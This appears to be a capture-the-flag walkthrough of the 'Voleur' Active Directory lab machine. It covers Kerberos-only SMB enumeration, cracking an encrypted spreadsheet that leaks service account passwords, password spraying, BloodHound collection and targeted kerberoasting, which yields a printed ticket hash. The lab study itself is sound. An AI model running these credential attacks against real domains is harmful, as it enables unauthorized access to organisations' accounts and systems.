This is a HTB AD focused machine with a difficulty of medium.

We are provided the initial credentials. 

![[Pasted_image_20250806092556.png]]

## Recon
#### Port scan
command:
```bash
Sudo nmap -Pn -sCV -p- --min-rate 2000 -T3 -oN voleur-port-scan 10.10.11.76
```

Output:
```bash
Nmap scan report for voleur.htb (10.10.11.76)
Host is up (1.8s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-06 01:58:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|_  256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52891/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52892/tcp open  msrpc         Microsoft Windows RPC
52903/tcp open  msrpc         Microsoft Windows RPC
52911/tcp open  msrpc         Microsoft Windows RPC
52926/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m16s
| smb2-time: 
|   date: 2025-08-06T02:00:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  5 21:02:14 2025 -- 1 IP address (1 host up) scanned in 545.78 seconds
```

From the output we have identified the domain as **voleur.htb**
From the output i noticed we have a clock screw of : 
> clock-skew: 8h00m16s

[[Resolving clock_skew error]]
#### SMB shares

```bash
smbclient -L //10.10.11.76// -U ryan.naylor 
session setup failed: NT_STATUS_NOT_SUPPORTED
```
The error **NT_STATUS_NOT_SUPPORTED** basically tells us that NTLM is not supported so we need to switch to kerberos.

Switching to **netexec** and using the flag `-k` to tell `netexec` to use kerberos instead of NTLM for authentication.

```bash
netexec smb 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k              
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\ryan.naylor:HollowOct31Nyt KDC_ERR_WRONG_REALM 

```

The error: *KDC_ERR_WRONG_REALM* basically is us being told to specify the domain we are authenticating to 
```bash
netexec smb 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    10.10.11.76      [-] voleur.htb\ryan.naylor:HollowOct31Nyt KRB_AP_ERR_SKEW 
```

`KRB_AP_ERR_SKEW` is caused by a huge time difference in time of the DC and host machine.
```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
> netexec smb 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    10.10.11.76      [-] voleur.htb\ryan.naylor:HollowOct31Nyt KDC_ERR_S_PRINCIPAL_UNKNOWN 

```

And now we get a new error: *KDC_ERR_S_PRINCIPAL_UNKNOWN* am not familiar with the error.  I consulted  a friend an all i had to do is add the domain controller to  my **/etc/hosts** file and it worked liked magic.
```bash
10.10.11.76 dc.voleur.htb
```

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
```

we can also use **-m spider_plus** to enumerate the shares and list the files in the shares.

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus          
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Started module spidering_plus with the following options:
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS dc.voleur.htb   445    dc               [*]     STATS_FLAG: True
SPIDER_PLUS dc.voleur.htb   445    dc               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  OUTPUT_FOLDER: /home/darklight/.nxc/modules/nxc_spider_plus
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
SPIDER_PLUS dc.voleur.htb   445    dc               [+] Saved share-file metadata to "/home/darklight/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json".
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Filtered Shares:  1
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total folders found:  27
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total files found:    7
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size average:    3.55 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size min:        22 B
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size max:        16.5 KB

```

```json
 cat /home/darklight/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json 
{
    "IT": {
        "First-Line Support/Access_Review.xlsx": {
            "atime_epoch": "2025-01-31 12:09:27",
            "ctime_epoch": "2025-01-29 12:39:51",
            "mtime_epoch": "2025-05-30 01:23:36",
            "size": "16.5 KB"
        }
    },
    "NETLOGON": {},
    "SYSVOL": {
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2025-05-08 03:01:14",
            "ctime_epoch": "2025-01-29 11:42:28",
            "mtime_epoch": "2025-05-08 03:01:14",
            "size": "22 B"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/Audit/audit.csv": {
            "atime_epoch": "2025-05-08 03:01:14",
            "ctime_epoch": "2025-05-08 03:01:02",
            "mtime_epoch": "2025-05-08 03:01:14",
            "size": "377 B"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-05-08 03:00:32",
            "ctime_epoch": "2025-01-29 11:42:28",
            "mtime_epoch": "2025-05-08 03:00:32",
            "size": "1.19 KB"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2025-01-29 11:49:11",
            "ctime_epoch": "2025-01-29 11:49:11",
            "mtime_epoch": "2025-01-29 11:49:11",
            "size": "2.72 KB"
        },
        "voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2025-01-30 16:57:03",
            "ctime_epoch": "2025-01-29 11:42:28",
            "mtime_epoch": "2025-01-30 16:57:03",
            "size": "23 B"
        },
        "voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-01-30 16:57:03",
            "ctime_epoch": "2025-01-29 11:42:28",
            "mtime_epoch": "2025-01-30 16:57:03",
            "size": "4.01 KB"
        }
    }
}                                        
```

that is a faster way of doing things.

If you want to enumerate the share and download the contents, you basically need to add this flag.
```bash
-o DOWNLOAD_FLAG=True
```

When trying to download the specific file i keep running to issues so i decided to switch to impacket

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --get-file "\\IT\\First-Line\ Support\\Access_Review.xlsx" Access_Review.xlsx

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Copying "\IT\First-Line\ Support\Access_Review.xlsx" to "Access_Review.xlsx"
SMB         dc.voleur.htb   445    dc               [-] Error writing file "\IT\First-Line\ Support\Access_Review.xlsx" from share "C$": SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
impacket-smbclient -k -no-pass voleur.htb/ryan.naylor@dc.voleur.htb

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 23:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 12:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 01:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
# 

```

more on netexec can be found here https://tools.thehacker.recipes/impacket/examples/smbclient.py

The file was encrypted 
![[Pasted_image_20250806113640.png]]

Quick research on **CDFV2** (Compound Document Format) i found out that we are dealing with an office document. 

Lets extract the hash and try to crack it 
```bash
office2john Access_Review.xlsx > hash.txt 
```

```bash
john hash.txt -w /usr/share/wordlists/rockyou.txt

Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:20 DONE (2025-08-06 11:46) 0.04899g/s 101.9p/s 101.9c/s 101.9C/s ilovegod..sayang
Use the "--show" option to display all of the cracked passwords reliably
Session completed.   
```

we cracked the hash successfully: **football1**

To decrypt the file we need a tool that is installed using this command: 
```bash
pip install msoffcrypto-tool

```

```bash
msoffcrypto-tool Access_Review.xlsx decrypted.xlsx -p football1 -v
Version: 5.4.2
OOXMLFile.type: agile
totalSize: 10701
```

now we have an excel file 
![[Pasted_image_20250806115626.png]]

```
xlsx2csv decrypted.xlsx | sed 's/,/,  /g'

User,  Job Title,  Permissions,  Notes
Ryan.Naylor,  First-Line Support Technician,  SMB,  Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant,  First-Line Support Technician,  SMB,  
Lacey.Miller,  Second-Line Support Technician,  Remote Management Users,  
Todd.Wolfe,  Second-Line Support Technician,  Remote Management Users,  Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
Jeremy.Combs,  Third-Line Support Technician,  Remote Management Users.,  Has access to Software folder.
Administrator,  Administrator,  Domain Admin,  Not to be used for daily tasks!


Service Accounts,  ,  ,  
svc_backup,   ,  Windows Backup,  Speak to Jeremy!
svc_ldap,  ,  LDAP Services,  P/W - M1XyC9pW7qT5Vn
svc_iis,  ,  IIS Administration,  P/W - N5pXyW1VqM7CZ8
svc_winrm,  ,  Remote Management ,  Need to ask Lacey as she reset this recently.

```

from the file we get some important information.

> *Ryan.Naylor,  First-Line Support Technician,  SMB,  Has Kerberos Pre-Auth disabled temporarily to test legacy systems.*

In this case we could have done AES-REP roasting to compromise the user -- a technique that allows an attacker to request a Kerberos TGT for a user **without needing to know the password**, then crack the hash offline , but we already have the credentials fro the user. 

>*Todd.Wolfe,  Second-Line Support Technician,  Remote Management Users,  Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.*

we have Todd and his password but the account is deleted. Maybe we find a user with the enough privileges to restore the user.

We also notice **Lacey.Miller** is a remote management user, if we compromise the user, then we can login using evil-winrm.

Also **Jeremy.Combs** is a remote management user, and has access **Software folder** but we haven't come across such a folder yet.

#### User and Group Recon

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k  --rid-brute
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               498: VOLEUR\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               500: VOLEUR\Administrator (SidTypeUser)
SMB         dc.voleur.htb   445    dc               501: VOLEUR\Guest (SidTypeUser)
SMB         dc.voleur.htb   445    dc               502: VOLEUR\krbtgt (SidTypeUser)
SMB         dc.voleur.htb   445    dc               512: VOLEUR\Domain Admins (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               513: VOLEUR\Domain Users (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               514: VOLEUR\Domain Guests (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               515: VOLEUR\Domain Computers (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               516: VOLEUR\Domain Controllers (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               517: VOLEUR\Cert Publishers (SidTypeAlias)
SMB         dc.voleur.htb   445    dc               518: VOLEUR\Schema Admins (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               519: VOLEUR\Enterprise Admins (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               520: VOLEUR\Group Policy Creator Owners (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               521: VOLEUR\Read-only Domain Controllers (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               522: VOLEUR\Cloneable Domain Controllers (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               525: VOLEUR\Protected Users (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               526: VOLEUR\Key Admins (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               527: VOLEUR\Enterprise Key Admins (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               553: VOLEUR\RAS and IAS Servers (SidTypeAlias)
SMB         dc.voleur.htb   445    dc               571: VOLEUR\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         dc.voleur.htb   445    dc               572: VOLEUR\Denied RODC Password Replication Group (SidTypeAlias)
SMB         dc.voleur.htb   445    dc               1000: VOLEUR\DC$ (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1101: VOLEUR\DnsAdmins (SidTypeAlias)
SMB         dc.voleur.htb   445    dc               1102: VOLEUR\DnsUpdateProxy (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               1103: VOLEUR\ryan.naylor (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1104: VOLEUR\marie.bryant (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1105: VOLEUR\lacey.miller (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1106: VOLEUR\svc_ldap (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1107: VOLEUR\svc_backup (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1108: VOLEUR\svc_iis (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1109: VOLEUR\jeremy.combs (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1112: VOLEUR\First-Line Technicians (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               1113: VOLEUR\Second-Line Technicians (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               1114: VOLEUR\Third-Line Technicians (SidTypeGroup)
SMB         dc.voleur.htb   445    dc               1601: VOLEUR\svc_winrm (SidTypeUser)
SMB         dc.voleur.htb   445    dc               1602: VOLEUR\Restore_Users (SidTypeGroup)
```

save the output to a file and retrieve users.

```bash
cat userGroup.dump | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f 2 > users.txt

cat users.txt                                                                              
Administrator
Guest
krbtgt
DC$
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm

```

We have two passwords , we can try password spraying to test for password reuse among the users. 

No password reuse.
```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
netexec smb dc.voleur.htb -u users.txt -p passwords.txt -k --continue-on-success
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Guest:NightT1meP1dg3on14 KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\krbtgt:NightT1meP1dg3on14 KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\DC$:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\ryan.naylor:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\marie.bryant:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\lacey.miller:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_ldap:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_iis:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\jeremy.combs:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Guest:HollowOct31Nyt KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\krbtgt:HollowOct31Nyt KDC_ERR_CLIENT_REVOKED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\DC$:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\marie.bryant:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\lacey.miller:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_ldap:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_iis:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\jeremy.combs:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED 
```

#### AD Recon

Lets dump all the AD data so that we can analyze using bloodhound

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
bloodhound-ce-python -u ryan.naylor@voleur.htb -p HollowOct31Nyt -d voleur.htb -ns 10.10.11.76 -k -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.76:445)] timed out
ERROR: Unhandled exception in computer DC.voleur.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound_ce/enumeration/computers.py", line 130, in process_computer
    unresolved = c.rpc_get_group_members(555, c.rdp)
  File "/usr/lib/python3/dist-packages/bloodhound_ce/ad/computer.py", line 839, in rpc_get_group_members
    raise e
  File "/usr/lib/python3/dist-packages/bloodhound_ce/ad/computer.py", line 802, in rpc_get_group_members
    resp = samr.hSamrQueryInformationAlias(dce, aliasHandle=aliashandle)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/samr.py", line 2631, in hSamrQueryInformationAlias
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 861, in request
    answer = self.recv()
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1316, in recv
    response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 555, in recv
    return self.__smb_connection.readFile(self.__tid, self.__handle)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 572, in readFile
    bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 2065, in read_andx
    return self.read(tid, fid, offset, max_size, wait_answer)
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1400, in read
    ans = self.recvSMB(packetID)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 515, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 917, in recv_packet
    data = self.__read(timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1004, in __read
    data = self.read_function(4, timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 988, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 01M 47S
INFO: Compressing output into 20250806205123_bloodhound.zip

```

Used most of my time trying find a way to compromise any other user from ryan, only to realize i had missed some credentials in the excel file. 
```bash
svc_ldap,  ,  LDAP Services,  P/W - M1XyC9pW7qT5Vn
svc_iis,  ,  IIS Administration,  P/W - N5pXyW1VqM7CZ8
```
both passwords are valid for the specified accounts

The account of interest is **svc_ldap**

![[Pasted_image_20250806133910.png]]

Earlier we had assumed that **Lacey.Miller** is a member of the **Remote Management Users** group but bloodhound says otherwise.

![[Pasted_image_20250806134209.png]]

From AD output i could not find anything interesting, from evil_winrm account. My thought is after getting a winrm session then we can try to retrieve the deleted user.

## Exploitation

### Targeted kerberoasting

So the next account of interest is **svc_winrm** 
Based on the rights that **svc_ldap** has , we need to perform a targeted kerberoasting attack.

This helps us with the setting of the spn if we have the permissions to do so instead of adding it manually.

First of all we need to get the tgt for svc_ldap and export it 
```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
>  impacket-getTGT voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -dc-ip 10.10.11.76
/home/darklight/Documents/ctf/htb/machines/Voleur/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache

┌──(.venv)─(darklight㉿jinx)-[~/…/ctf/htb/machines/Voleur]
└─$ export KRB5CCNAME=svc_ldap.ccache   
```

Then perform the targeted kerberoasting

```bash
faketime "$(ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" \
> python3 targetedKerberoast/targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$1fdc8f560d1a4d23dd2d8d124d66c168$7b6e784c4417eada9c1ae970e9880f51a15727ba8eaec99c0eb62e53a3fdd456113854e4d0f8521afd9d3360f0fe85b0ac7aaf5b94086dcdb160e145897648fa6f83a6bab34b2f1b127124472d4fa522666ca95715db4d67e9a55fa2405e96722e3dddc8160a91a1c32ce5b44bf44cb42927d476d4ca60339d438cf9b68654275e2e27c43b4803e35c9b548ef51d4f4da234e7617e4ed8cda7c9bb458ce053180da20cc1e58c9741c5517704f6865bc56087b0f3fa50bb01ca03cab66ac2feae425a6bb99474e2f3c15e400b66118d4976730a33efd8d16243157ee9f7bf7f940fadd9299d21c259e01a948f6811f7a116050ec1c7dc4ffdb3ff4a0f9b5265b6465dc09222c52f8af441d4dcb489b882b226febed73a26eacf80a0b28ff5498e7e7b6b5f160872fb03fcf11deb4bddb16a551ba6e718a6d26d37ebdc21e79449cc45e9070ec3c04d9c40561d3039f3b1e9472486651791cd58fd96b7010e1d01b22859babb9d1f2414aca732167459634a29d31008da2e7dea79ab135dbebb5b7bcf244c161432c54ca71816d8dd406b5d587ac07414ebd3029091fdf103e1adfa9eec8f577797a885ad37b3b68f8f7bef56552cb45818b6757ced277860c29869e0b89d